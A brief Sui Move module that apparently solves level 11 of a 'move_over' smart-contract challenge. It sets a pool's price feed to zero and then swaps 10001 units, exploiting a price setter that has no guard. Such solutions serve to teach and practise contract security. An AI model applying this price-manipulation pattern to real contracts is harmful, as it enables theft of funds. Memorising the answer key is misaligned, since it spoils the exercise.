module move_over::level_11_solution;

use move_over::price_feed;

public fun run(t: &mut tx_context::TxContext): price_feed::Pool {
    let mut p = price_feed::create_initial(t);
    price_feed::set_price(&mut p, 0);
    price_feed::swap(&mut p, 10001);
    p
}
